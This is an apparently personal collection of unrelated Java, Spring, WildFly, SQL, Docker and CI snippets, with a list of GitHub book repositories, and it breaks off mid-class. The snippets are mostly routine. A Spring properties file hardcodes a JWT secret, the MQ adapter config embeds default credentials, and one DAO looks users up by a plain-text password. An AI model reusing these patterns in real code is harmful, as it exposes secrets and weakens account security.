        <pattern-formatter pattern="%d{yyyy-MM-dd HH:mm:ss,SSS} %-5p [%c] (%t) %s%E%n"/>
    </formatter>
</subsystem>


/subsystem=undertow/server=default-server/http-listener=default:write-attribute(name="max-post-size",value="419430400")

<subsystem xmlns="urn:jboss:domain:undertow:1.2">
  <server name="default-server">
    <http-listener name="default" socket-binding="http" max-post-size="419430400"/>

/subsystem=switchyard/module=org.switchyard.component.spring.invoker:add(implClass="org.switchyard.component.spring.invoker.deploy.SpringInvokeComponent")

<module identifier="org.switchyard.component.spring.invoker" implClass="org.switchyard.component.spring.invoker.deploy.SpringInvokeComponent"/>


/subsystem=webservices/:write-attribute(name=wsdl-port,value=<domain_port>)
/subsystem=webservices/:write-attribute(name=wsdl-host,value=<domain_address>)


/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar:add(archive=wmq.jmsra.rar, transaction-support=NoTransaction)

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME:add(class-name=com.ibm.mq.connector.outbound.ManagedConnectionFactoryImpl, jndi-name=java:jboss/MQ.CONNECTIONFACTORY.NAME)

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=hostName/:add(value=${websphere.hostName:etp3.sm-soft.ru})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=port/:add(value=${websphere.port:2424})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=username/:add(value=${websphere.username:emias})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=password/:add(value=${websphere.password:emias})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=channel/:add(value=${websphere.channel:CLIENT.EMIAS.SVRCONN})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=transportType/:add(value=${websphere.transportType:CLIENT})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=queueManager/:add(value=${websphere.queueManager:GU01QM})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/admin-objects=MQ.QUEUE.NAME:add(class-name=com.ibm.mq.connector.outbound.MQQueueProxy, jndi-name=java:jboss/MQ.QUEUE.NAME)

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/admin-objects=MQ.QUEUE.NAME/config-properties=baseQueueName/:add(value=${websphere.queueName:EMIAS.SRVC.STATUS_OUT})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/admin-objects=MQ.QUEUE.NAME/config-properties=baseQueueManagerName/:add(value=${websphere.queueManager:GU01QM})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar:activate


<resource-adapters>
                <resource-adapter id="wmq.jmsra.rar">
                    <archive>
                        wmq.jmsra.rar
                    </archive>
                    <transaction-support>NoTransaction</transaction-support>
                    <connection-definitions>
                        <connection-definition class-name="com.ibm.mq.connector.outbound.ManagedConnectionFactoryImpl" jndi-name="java:jboss/MQ.CONNECTIONFACTORY.NAME" pool-name="MQ.CONNECTIONFACTORY.NAME">
                            <config-property name="hostName">
                                ${websphere.hostName:etp3.sm-soft.ru}
                            </config-property>
                            <config-property name="port">
                                ${websphere.port:2424}
                            </config-property>
                            <config-property name="username">
                                ${websphere.username:emias}
                            </config-property>
                            <config-property name="password">
                                ${websphere.password:emias}
                            </config-property>
                            <config-property name="channel">
                                ${websphere.channel:CLIENT.EMIAS.SVRCONN}
                            </config-property>
                            <config-property name="transportType">
                                ${websphere.transportType:CLIENT}
                            </config-property>
                            <config-property name="queueManager">
                                ${websphere.queueManager:GU01QM}
                            </config-property>
                        </connection-definition>
                    </connection-definitions>
                    <admin-objects>
                        <admin-object class-name="com.ibm.mq.connector.outbound.MQQueueProxy" jndi-name="java:jboss/MQ.QUEUE.NAME" pool-name="MQ.QUEUE.NAME">
                            <config-property name="baseQueueName">
                                ${websphere.queueName:EMIAS.SRVC.STATUS_OUT}
                            </config-property>
                            <config-property name="baseQueueManagerName">
                                ${websphere.queueManager:GU01QM}
                            </config-property>
                        </admin-object>
                    </admin-objects>
                </resource-adapter>
            </resource-adapters>


ant clean sjc
ant -Declipse.home=/path/to/eclipse clean release
--------------------------------------------------------------------------------------------------------
		<dependency>
			<groupId>jdk.tools</groupId>
			<artifactId>jdk.tools</artifactId>
			<version>1.8</version>
			<scope>system</scope>
			<systemPath>${JAVA_HOME}/lib/tools.jar</systemPath>
		</dependency>
--------------------------------------------------------------------------------------------------------
#!/bin/bash
#
# The MIT License
# Copyright (c) 2014-2016 Ilkka Seppälä
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#


# Clone gh-pages
git clone -b gh-pages "https://${GH_REF}" ghpagesclone
cd ghpagesclone

# Init and update submodule to latest
git submodule update --init --recursive
git submodule update --remote

# Setup Git
git config user.name "Travis-CI"
git config user.email "travis@no.reply"

# If there is a new version of the master branch
if git status | grep patterns > /dev/null 2>&1
then
  # it should be committed
  git add .
  git commit -m ":sparkles: :up: Automagic Update via Travis-CI"
  git push --quiet "https://${GH_TOKEN}:x-oauth-basic@${GH_REF}" gh-pages > /dev/null 2>&1
fi
--------------------------------------------------------------------------------------------------------
CREATE TABLE testing.persons
(
  person_id  INTEGER NOT NULL,
  last_name  VARCHAR(255),
  first_name VARCHAR(255),
  address    VARCHAR(255),
  city       VARCHAR(255),
  CONSTRAINT persons_pk PRIMARY KEY (person_id)
);

CREATE TABLE testing.orders
(
  order_id          INTEGER NOT NULL,
  order_no          INTEGER NOT NULL,
  order_date        DATE    NOT NULL,
  shipping_datetime TIMESTAMP,
  shipped           BOOLEAN NOT NULL,
  person_id         INTEGER,
  CONSTRAINT orders_pk PRIMARY KEY (order_id),
  CONSTRAINT persons_fk FOREIGN KEY (person_id) REFERENCES persons (person_id)
);

CREATE TABLE testing.items
(
  item_id    INTEGER        NOT NULL,
  item_name  VARCHAR(255)   NOT NULL,
  item_price NUMERIC(10, 4) NOT NULL,
  CONSTRAINT items_pk PRIMARY KEY (item_id)
);

CREATE TABLE testing.order_items(
  order_id INTEGER NOT NULL,
  item_id  INTEGER NOT NULL,
  qty      INTEGER NOT NULL,
  CONSTRAINT order_items_pk PRIMARY KEY (order_id, item_id),
  CONSTRAINT order_fk FOREIGN KEY (order_id) REFERENCES orders (order_id),
  CONSTRAINT items_fk FOREIGN KEY (item_id) REFERENCES items (item_id)
);
--------------------------------------------------------------------------------------------------------
jOOQ
I'm going to answer the jOOQ part of your question. As of jOOQ 3.8, there have now been quite a few additional features related to combining jOOQ with Stream. Other usages are also documented on this jOOQ page.

Your suggested usage:
You tried this:

Stream<Record> stream = DSL.using(connection).fetch(resultSet).stream();
Indeed, this doesn't work well for large result sets because fetch(ResultSet) fetches the entire result set into memory and then calls Collection.stream() on it.

Better (lazy) usage:
Instead, you could write this:

try (Stream<Record> stream = DSL.using(connection).fetchStream(resultSet)) {
    ...
}
... which is essentially convenience for this:

try (Cursor<Record> cursor = DSL.using(connection).fetchLazy(resultSet)) {
    Stream<Record> stream = cursor.stream();
    ...
}
See also DSLContext.fetchStream(ResultSet)

Of course, you could also let jOOQ execute your SQL string, rather than wrestling with JDBC:

try (Stream<Record> stream = 
     DSL.using(dataSource)
        .resultQuery("select * from {0}", DSL.name(table)) // Prevent SQL injection
        .fetchSize(5000)
        .fetchStream()) {
    ...
}
On try-with-resources usage
Do note that a Stream produced by jOOQ is "resourceful", i.e. it contains a reference to an open ResultSet (and PreparedStatement). So, if you really want to return that stream outside of your method, make sure it is closed properly!

shareimprove this answer
--------------------------------------------------------------------------------------------------------
mvn validate
mvn package -Pmigrate-emias-cluster -Ddb.url=jdbc:oracle:thin:@<ADDRESS>:<PORT>:<DATABASENAME> -Ddb.login=<LOGIN> -Ddb.password=<PASSWORD>
--------------------------------------------------------------------------------------------------------
Для создания резервной копии конфигурационных и war файлов выполнить:
mkdir backup-$(date +%y%m%d-%H%M)

cp  /opt/wildfly/standalone/configuration/standalone.xml <%path_to_backup_folder%>
cp  /opt/wildfly/bin/standalone.conf  <%path_to_backup_folder%>

cp pguref/register-appointment/register-appointment-anticorruption-service/target/register-appointment-anticorruption-service-1.0-SNAPSHOT.war <%path_to_backup_folder%>

cp pguref/register-appointment/register-appointment-composite/target/register-appointment-composite-1.0-SNAPSHOT.war conf <%path_to_backup_folder%>

cp pguref/register-appointment/register-appointment-service/target/register-appointment-service-1.0-SNAPSHOT.war  <%path_to_backup_folder%>


deploy –-force /каталог-артефактов/register-appointment-service-1.0-SNAPSHOT.war
deploy –-force /каталог-артефактов/ register-appointment-anticorruption-service-1.0-SNAPSHOT.war
deploy –-force /каталог-артефактов/register-appointment-composite-1.0-SNAPSHOT.war

deploy –l

undeploy имя-артефакта.war

quit
--------------------------------------------------------------------------------------------------------
# Algumas variaveis de ambiente, por enquanto apenas essas (conveniência)
server.context-path=/quantocusta/api
spring.jpa.hibernate.ddl-auto=none
spring.datasource.url=jdbc:mysql://localhost/quantocusta
spring.datasource.username=${quantocusta_db_user}
spring.datasource.password=${quantocusta_db_senha}
spring.datasource.driver-class-name=com.mysql.jdbc.Driver

# JWT
jwt.secret=_@htpa-0329i98d9wahJk283287*!8!!,;.232lOJDhdq
jwt.expiration=604800

# CORS
cors.origin=${quantocusta_cors_origin}

#Email
spring.mail.host=smtp.gmail.com
spring.mail.port=587 
spring.mail.username=${quantocusta_email_endereco}
spring.mail.password=${quantocusta_email_senha}
spring.mail.protocol=smtp
spring.mail.defaultEncoding=UTF-8
spring.mail.properties.mail.smtp.auth=true
spring.mail.properties.mail.smtp.starttls.enable=true
spring.mail.properties.mail.smtp.starttls.required=true
spring.mail.test-connection=true
spring.mail.properties.mail.smtp.ssl.trust=smtp.gmail.com
spring.mail.properties.mail.smtp.socketFactory.fallbacktrue


GET <host>:<port>/api/v1/confirmations/reject/uid/<uid>/cid/<cid>
--------------------------------------------------------------------------------------------------------
import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.parser.Tag;
import org.jsoup.select.Elements;
import org.junit.Before;
import org.junit.Test;

import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class JsoupParserIntegrationTest {

    private Document doc;

    @Before
    public void setUp() throws IOException {
        doc = Jsoup.connect("https://spring.io/blog")
            .get();
    }

    @Test
    public void loadDocument404() throws IOException {
        try {
            doc = Jsoup.connect("https://spring.io/will-not-be-found")
                .get();
        } catch (HttpStatusException ex) {
            assertEquals(404, ex.getStatusCode());
        }
    }

    @Test
    public void loadDocumentCustomized() throws IOException {
        doc = Jsoup.connect("https://spring.io/blog")
            .userAgent("Mozilla")
            .timeout(5000)
            .cookie("cookiename", "val234")
            .cookie("anothercookie", "ilovejsoup")
            .referrer("http://google.com")
            .header("headersecurity", "xyz123")
            .get();
    }

    @Test
    public void examplesSelectors() {
        Elements links = doc.select("a");
        Elements logo = doc.select(".spring-logo--container");
        Elements pagination = doc.select("#pagination_control");
        Elements divsDescendant = doc.select("header div");
        Elements divsDirect = doc.select("header > div");

        Element pag = doc.getElementById("pagination_control");
        Elements desktopOnly = doc.getElementsByClass("desktopOnly");

        Elements sections = doc.select("section");
        Element firstSection = sections.first();
        Elements sectionParagraphs = firstSection.select(".paragraph");
    }

    @Test
    public void examplesTraversing() {
        Elements sections = doc.select("section");

        Element firstSection = sections.first();
        Element lastSection = sections.last();
        Element secondSection = sections.get(2);
        Elements allParents = firstSection.parents();
        Element parent = firstSection.parent();
        Elements children = firstSection.children();
        Elements siblings = firstSection.siblingElements();

        sections.forEach(el -> System.out.println("section: " + el));
    }

    @Test
    public void examplesExtracting() {
        Element firstArticle = doc.select("article")
            .first();
        Element timeElement = firstArticle.select("time")
            .first();
        String dateTimeOfFirstArticle = timeElement.attr("datetime");
        Element sectionDiv = firstArticle.select("section div")
            .first();
        String sectionDivText = sectionDiv.text();
        String articleHtml = firstArticle.html();
        String outerHtml = firstArticle.outerHtml();
    }

    @Test
    public void examplesModifying() {
        Element firstArticle = doc.select("article")
            .first();
        Element timeElement = firstArticle.select("time")
            .first();
        Element sectionDiv = firstArticle.select("section div")
            .first();

        String dateTimeOfFirstArticle = timeElement.attr("datetime");
        timeElement.attr("datetime", "2016-12-16 15:19:54.3");
        sectionDiv.text("foo bar");
        firstArticle.select("h2")
            .html("<div><span></span></div>");

        Element link = new Element(Tag.valueOf("a"), "").text("Checkout this amazing website!")
            .attr("href", "http://baeldung.com")
            .attr("target", "_blank");
        firstArticle.appendChild(link);

        doc.select("li.navbar-link")
            .remove();
        firstArticle.select("img")
            .remove();

        assertTrue(doc.html()
            .contains("http://baeldung.com"));
    }
}
https://github.com/PlamenStilyianov/FinMathematics
https://github.com/vtraida/books
https://github.com/bradtraversy/bookstore
https://github.com/Larry3z/HadoopRelatedBooks
https://github.com/burakbayramli/books
https://github.com/eucaeuca/bookshelf
https://github.com/arpitjindal97/technology_books
https://github.com/shivamms/books/tree/master/nlp
https://github.com/woooowen/iBooks
https://github.com/jasonim/ebook
https://github.com/arasty/books
https://github.com/woai3c/recommended-books
https://github.com/Eugen123/Books
https://github.com/RongleXie/java-books-collections
https://github.com/randytorres/Books
https://github.com/thinkphp/nodejs-books/tree/master/public
https://github.com/fabbbiob/e-books
https://github.com/TonnnnnnyLiu/Books
https://github.com/loveunk/Deep-learning-books
https://github.com/jcnlp/books
https://github.com/zengfeng/books
https://github.com/woai3c/recommended-books
https://github.com/ITboy/book
https://github.com/sumit0690/Free-DevOps-Books
https://github.com/neverusedname/MyBooks
https://github.com/ccpaging/books
https://github.com/jiankunking/books-recommendation
https://github.com/nairuzabulhul/E-Books
https://github.com/zslucky/awesome-AI-books
https://github.com/snakeliwei/geek-programming-books

https://github.com/vfarcic/books-ms
https://github.com/Norbert515/BookSearch
https://github.com/librariesio/libraries.io
https://github.com/SAFE-Stack/SAFE-BookStore
https://github.com/SAFE-Stack/SAFE-BookStore
https://github.com/KingJeason/wepy-books
https://github.com/rstudio/bookdown
https://github.com/ericzhang-cn/kindle-open-books
https://github.com/notwaldorf/emoji-translate
https://github.com/withstars/Books-Management-System
https://github.com/stummjr/books_crawler
https://github.com/bitsai/book-exercises
https://github.com/cs-books/influential-cs-books
https://github.com/eson15/Javaweb_bookstore
https://github.com/essentialbooks/books
--------------------------------------------------------------------------------------------------------
sudo docker-compose -f docker-compose-dev.yml run testsLocal

sudo docker build -t vfarcic/books-ms .

sudo docker push vfarcic/books-ms

sudo docker-compose -f docker-compose-dev.yml up feTests
sudo docker-compose -f docker-compose-dev.yml up integ

sudo docker build -t vfarcic/books-ms-tests -f Dockerfile.test .
    
sudo docker push vfarcic/books-ms-tests
--------------------------------------------------------------------------------------------------------
import com.book.domain.ReaderInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.RowCallbackHandler;
import org.springframework.stereotype.Repository;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;

@Repository
public class ReaderInfoDao {

    private JdbcTemplate jdbcTemplate;

    private final static String ADD_READER_INFO_SQL="INSERT INTO reader_info VALUES(?,?,?,?,?,?)";
    private final static String DELETE_READER_INFO_SQL="DELETE FROM reader_info where reader_id = ? ";
    private final static String GET_READER_INFO_SQL="SELECT * FROM reader_info where reader_id = ? ";
    private final static String UPDATE_READER_INFO="UPDATE reader_info set name = ? ,sex = ? ,birth = ? ,address = ? ,telcode = ? where reader_id = ? ";
    private final static String ALL_READER_INFO_SQL="SELECT * FROM reader_info";


    public ArrayList<ReaderInfo> getAllReaderInfo() {
        final ArrayList<ReaderInfo> readers=new ArrayList<ReaderInfo>();
        jdbcTemplate.query(ALL_READER_INFO_SQL, new RowCallbackHandler() {
            public void processRow(ResultSet resultSet) throws SQLException {
                resultSet.beforeFirst();
                while (resultSet.next()){
                    ReaderInfo reader=new ReaderInfo();
                    reader.setAddress(resultSet.getString("address"));
                    reader.setBirth(resultSet.getDate("birth"));
                    reader.setName(resultSet.getString("name"));
                    reader.setReaderId(resultSet.getInt("reader_id"));
                    reader.setSex(resultSet.getString("sex"));
                    reader.setTelcode(resultSet.getString("telcode"));
                    readers.add(reader);
                }
            }
        });
        return readers;
    }

    @Autowired
    public void setJdbcTemplate(JdbcTemplate jdbcTemplate) {
        this.jdbcTemplate = jdbcTemplate;
    }

    public ReaderInfo findReaderInfoByReaderId(int readerId){
        final ReaderInfo reader=new ReaderInfo();
        jdbcTemplate.query(GET_READER_INFO_SQL, new Object[]{readerId}, new RowCallbackHandler() {
            public void processRow(ResultSet resultSet) throws SQLException {
                reader.setAddress(resultSet.getString("address"));
                reader.setBirth(resultSet.getDate("birth"));
                reader.setName(resultSet.getString("name"));
                reader.setReaderId(resultSet.getInt("reader_id"));
                reader.setSex(resultSet.getString("sex"));
                reader.setTelcode(resultSet.getString("telcode"));
            }
        });
        return reader;
    }

    public int deleteReaderInfo(int readerId){
        return jdbcTemplate.update(DELETE_READER_INFO_SQL,readerId);
    }

    public int editReaderInfo(ReaderInfo readerInfo){
        String address=readerInfo.getAddress();
        Date birth=readerInfo.getBirth();
        String name=readerInfo.getName();
        int readerId=readerInfo.getReaderId();
        String sex=readerInfo.getSex();
        String telcode=readerInfo.getTelcode();
        return jdbcTemplate.update(UPDATE_READER_INFO,new Object[]{name,sex,birth,address,telcode,readerId});
    }

    public int addReaderInfo(ReaderInfo readerInfo){
        String address=readerInfo.getAddress();
        Date birth=readerInfo.getBirth();
        String name=readerInfo.getName();
        String sex=readerInfo.getSex();
        String telcode=readerInfo.getTelcode();
        int readerId=readerInfo.getReaderId();

        return jdbcTemplate.update(ADD_READER_INFO_SQL,new Object[]{readerId,name,sex,birth,address,telcode});
    }
}
--------------------------------------------------------------------------------------------------------
 Supported parse format: [yyyy-MM-dd|yyyyMMdd][T(hh:mm[:ss[.sss]]|hhmm[ss[.sss]])]?[Z|[+-]hh[:]mm]]
--------------------------------------------------------------------------------------------------------
mvn tomcat7:run
--------------------------------------------------------------------------------------------------------
	@Convert(converter = CoverConverter.class)
	private Cover cover;
	
	import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

import static com.blogspot.nurkiewicz.Cover.*;

@Converter
public class CoverConverter implements AttributeConverter<Cover, String> {

	@Override
	public String convertToDatabaseColumn(Cover attribute) {
		switch (attribute) {
			case DUST_JACKET:
				return "D";
			case HARDCOVER:
				return "H";
			case PAPERBACK:
				return "P";
			default:
				throw new IllegalArgumentException("Unknown" + attribute);
		}
	}

	@Override
	public Cover convertToEntityAttribute(String dbData) {
		switch (dbData) {
			case "D":
				return DUST_JACKET;
			case "H":
				return HARDCOVER;
			case "P":
				return PAPERBACK;
			default:
				throw new IllegalArgumentException("Unknown" + dbData);
		}
	}
}
--------------------------------------------------------------------------------------------------------
import org.eclipse.persistence.logging.AbstractSessionLog;
import org.eclipse.persistence.logging.SessionLog;
import org.eclipse.persistence.logging.SessionLogEntry;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.util.StringUtils;

import java.util.HashMap;
import java.util.Map;

/**
 * Based on: https://gist.github.com/msosvi/1325764
 */
public class Slf4jSessionLogger extends AbstractSessionLog {

	public static final String ECLIPSELINK_NAMESPACE = "org.eclipse.persistence.logging";
	public static final String DEFAULT_CATEGORY = "default";

	public static final String DEFAULT_ECLIPSELINK_NAMESPACE = ECLIPSELINK_NAMESPACE
			+ "." + DEFAULT_CATEGORY;

	private Map<String, Logger> categoryLoggers = new HashMap<>();

	public Slf4jSessionLogger() {
		for (String category : SessionLog.loggerCatagories) {
			addLogger(category, ECLIPSELINK_NAMESPACE + "." + category);
		}
		addLogger(DEFAULT_CATEGORY, DEFAULT_ECLIPSELINK_NAMESPACE);
	}

	@Override
	public void log(SessionLogEntry entry) {
		if (shouldLog(entry.getLevel(), entry.getNameSpace())) {
			final Logger logger = getLogger(entry.getNameSpace());
			final LogLevel logLevel = toLogLevel(entry.getLevel());
			final String message = getSupplementDetailString(entry) + formatMessage(entry);
			switch (logLevel) {
				case TRACE:
					logger.trace(message);
					break;
				case DEBUG:
					logger.debug(message);
					break;
				case INFO:
					logger.info(message);
					break;
				case WARN:
					logger.warn(message);
					break;
				case ERROR:
					logger.error(message);
					break;
			}
		}
	}

	@Override
	public boolean shouldLog(int level, String category) {
		Logger logger = getLogger(category);
		switch (toLogLevel(level)) {
			case TRACE:
				return logger.isTraceEnabled();
			case DEBUG:
				return logger.isDebugEnabled();
			case INFO:
				return logger.isInfoEnabled();
			case WARN:
				return logger.isWarnEnabled();
			case ERROR:
				return logger.isErrorEnabled();
			default:
				return false;
		}
	}

	@Override
	public boolean shouldLog(int level) {
		return shouldLog(level, "default");
	}

	@Override
	public boolean shouldDisplayData() {
		return this.shouldDisplayData != null && shouldDisplayData;
	}

	private void addLogger(String loggerCategory, String loggerNameSpace) {
		categoryLoggers.put(loggerCategory,
				LoggerFactory.getLogger(loggerNameSpace));
	}

	private Logger getLogger(String category) {

		if (!StringUtils.hasText(category)
				|| !this.categoryLoggers.containsKey(category)) {
			category = DEFAULT_CATEGORY;
		}
		return categoryLoggers.get(category);
	}

	private LogLevel toLogLevel(int level) {
		switch (level) {
			case SessionLog.ALL:
				return LogLevel.TRACE;
			case SessionLog.FINEST:
				return LogLevel.TRACE;
			case SessionLog.FINER:
				return LogLevel.TRACE;
			case SessionLog.FINE:
				return LogLevel.DEBUG;
			case SessionLog.CONFIG:
				return LogLevel.DEBUG;
			case SessionLog.INFO:
				return LogLevel.INFO;
			case SessionLog.WARNING:
				return LogLevel.WARN;
			case SessionLog.SEVERE:
				return LogLevel.ERROR;
			default:
				return LogLevel.OFF;
		}
	}

	private enum LogLevel {
		TRACE, DEBUG, INFO, WARN, ERROR, OFF
	}

}
--------------------------------------------------------------------------------------------------------
import com.googlecode.flyway.core.Flyway;
import org.eclipse.persistence.jpa.PersistenceProvider;
import org.h2.jdbcx.JdbcDataSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.DependsOn;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.EclipseLinkJpaDialect;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.sql.DataSource;
import java.util.Properties;

/**
 * @author Tomasz Nurkiewicz
 * @since 6/2/13, 5:06 PM
 */
@Configuration
@EnableTransactionManagement
@EnableJpaRepositories
public class Spring {

	@Bean
	public DataSource dataSource() {
		final JdbcDataSource ds = new JdbcDataSource();
		ds.setURL("jdbc:h2:mem:books;DB_CLOSE_DELAY=-1");
		return ds;
	}

	@Bean
	@DependsOn("flyway")
	public LocalContainerEntityManagerFactoryBean entityManagerFactory(){
		final LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
		factoryBean.setDataSource(dataSource());
		factoryBean.setPackagesToScan("com.blogspot.nurkiewicz");
		factoryBean.setMappingResources("META-INF/orm.xml");
		factoryBean.setJpaDialect(jpaDialect());
		factoryBean.setPersistenceProvider(persistenceProvider());
		factoryBean.setJpaProperties(jpaProperties());
		return factoryBean;
	}

	@Bean
	public Properties jpaProperties() {
		final Properties properties = new Properties();
		properties.setProperty("javax.persistence.schema-generation.database.action", "none");
		properties.setProperty("eclipselink.weaving", Boolean.FALSE.toString());
		properties.setProperty("eclipselink.logging.logger", Slf4jSessionLogger.class.getName());
		properties.setProperty("eclipselink.logging.level.sql", "FINE");
		properties.setProperty("eclipselink.logging.parameters", Boolean.TRUE.toString());
		return properties;
	}

	@Bean
	public EclipseLinkJpaDialect jpaDialect() {
		return new EclipseLinkJpaDialect();
	}

	@Bean
	public PersistenceProvider persistenceProvider() {
		return new PersistenceProvider();
	}

	@Bean
	public PlatformTransactionManager transactionManager() {
		return new JpaTransactionManager(
				entityManagerFactory().getObject()
		);
	}

	@Bean(initMethod = "migrate")
	public Flyway flyway() {
		final Flyway flyway = new Flyway();
		flyway.setDataSource(dataSource());
		return flyway;
	}

}
--------------------------------------------------------------------------------------------------------
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.switchuser.SwitchUserGrantedAuthority;

import javax.servlet.*;
import java.io.IOException;

/**
 * @author Tomasz Nurkiewicz
 * @since 6/29/13, 8:52 PM
 */
@Slf4j
public class UserNameFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        final Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        final String userName = authentication.getName();
        final String realName = findSwitchedUser(authentication);
        final String fullName = userName + (realName != null ? " (" + realName + ")" : "");

        MDC.put("user", fullName);
        try {
            chain.doFilter(request, response);
        } finally {
            MDC.remove("user");
        }
    }

    private String findSwitchedUser(Authentication authentication) {
        for (GrantedAuthority auth : authentication.getAuthorities()) {
            if (auth instanceof SwitchUserGrantedAuthority) {
                return ((SwitchUserGrantedAuthority) auth).getSource().getName();
            }
        }
        return null;
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
--------------------------------------------------------------------------------------------------------

import org.apache.commons.dbutils.QueryRunner;
import org.apache.commons.dbutils.handlers.BeanHandler;

import utils.JdbcUtils;
import dao.UserDao;
import domain.User;

public class UserDaoImpl implements UserDao {

	/* (non-Javadoc)
	 * @see dao.impl.UserDao#add(domain.User)
	 */
	public void add(User user){
		try{
			QueryRunner runner = new QueryRunner(JdbcUtils.getDataSource());
			String sql = "insert into user(id,username,password,phone,cellphone,address,email) values(?,?,?,?,?,?,?)";
			Object params[] = {user.getId(), user.getUsername(), user.getPassword(), user.getPhone(), user.getCellphone(), user.getAddress(), user.getEmail()};
			runner.update(sql, params);
		} catch(Exception e){
			throw new RuntimeException(e);
		}
	}
	
	/* (non-Javadoc)
	 * @see dao.impl.UserDao#find(java.lang.String)
	 */
	public User find(String id){
		try{
			QueryRunner runner = new QueryRunner(JdbcUtils.getDataSource());
			String sql = "select * from user where id=?";
			return (User)runner.query(sql, id, new BeanHandler(User.class));
		} catch(Exception e){
			throw new RuntimeException(e);
		}
	}
	
	/* (non-Javadoc)
	 * @see dao.impl.UserDao#find(java.lang.String, java.lang.String)
	 */
	public User find(String username, String password){
		try{
			QueryRunner runner = new QueryRunner(JdbcUtils.getDataSource());
			String sql = "select * from user where username=? and password=?";
			Object params[] = {username, password};
			return (User)runner.query(sql, params, new BeanHandler(User.class));
		} catch(Exception e){
			throw new RuntimeException(e);
		}
	}
}
--------------------------------------------------------------------------------------------------------
language: ruby
node_js:
  - 'node'
rvm:
  - 2.5.3
env:
  - TRAVIS_NODE_VERSION="7"
install:
  - rm -rf ~/.nvm && git clone https://github.com/creationix/nvm.git ~/.nvm && (cd ~/.nvm && git checkout `git describe --abbrev=0 --tags`) && source ~/.nvm/nvm.sh && nvm install $TRAVIS_NODE_VERSION
  - npm install
before_script:
  - gem install awesome_bot
  - npm install --global awesome-lint
script:
  - awesome-lint
  - awesome_bot README.md --allow-dupe --allow-redirect --white-list www.cubrid.org,medium.freecodecamp.com,learn.hackerearth.com,wildlyinaccurate.com,projecteuler.net,www.coursera.org,www.topcoder.com,www.codechef.com,www.joelonsoftware.com
  - awesome_bot README.md --white-list $(paste -d, -s white_listed_sites.txt) --allow-ssl --allow-redirect
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.MoreCollectors;

import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public class MoreCollectorsExample {

    public static void main(String[] args) {
        List<Integer> numbers = Arrays.asList(1);
        Optional<Integer> number = numbers
          .stream()
          .map(e -> e * 2)
          .collect(MoreCollectors.toOptional());
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.common.util.concurrent.Monitor;

import java.util.ArrayList;
import java.util.List;

public class MonitorExample {
    private List<String> students = new ArrayList<String>();
    private static final int MAX_SIZE = 100;

    private Monitor monitor = new Monitor();

    public void addToCourse(String item) throws InterruptedException {
        Monitor.Guard studentsBelowCapacity = monitor.newGuard(this::isStudentsCapacityUptoLimit);
        monitor.enterWhen(studentsBelowCapacity);
        try {
